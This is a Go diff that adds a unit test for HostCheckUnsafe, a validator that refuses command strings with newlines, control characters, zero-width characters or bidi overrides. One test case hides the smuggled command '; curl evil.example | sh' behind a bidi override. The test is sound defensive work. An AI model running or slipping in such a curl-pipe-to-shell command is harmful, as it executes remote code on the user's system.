@@ -122,6 +122,35 @@ func TestOutcome_Values_IncludesReplies(t *testing.T) {
 	}
 }
 
+// TestHostCheckUnsafe proves HostCheckUnsafe's own character classes
+// (#49): a plain ASCII command and a tab pass, while a newline, a C0
+// control character, a zero-width character (Cf), and a bidi override
+// (also Cf) are each refused.
+func TestHostCheckUnsafe(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name  string
+		check string
+		want  bool
+	}{
+		{"plain_ascii", "go test ./x", false},
+		{"tab_allowed", "go test ./x\tgo test ./y", false},
+		{"newline_refused", "go test ./x\ngo test ./y", true},
+		{"c0_control_refused", "go test ./x\u0007", true},
+		{"zero_width_space_refused", "go test" + "\u200b" + " ./x", true},
+		{"bidi_override_refused", "echo ok" + "\u202e" + " ; curl evil.example | sh", true},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			if got := HostCheckUnsafe(tt.check); got != tt.want {
+				t.Errorf("HostCheckUnsafe(%q) = %v, want %v", tt.check, got, tt.want)
+			}
+		})
+	}
+}
+
 // TestEscalationOrigin_Values_IncludesPackage9Origins proves the four
 // origins Package 9 adds (design section 4.1), review, judge, shipping, and
 // respond, appear in EscalationOrigin's own Values().
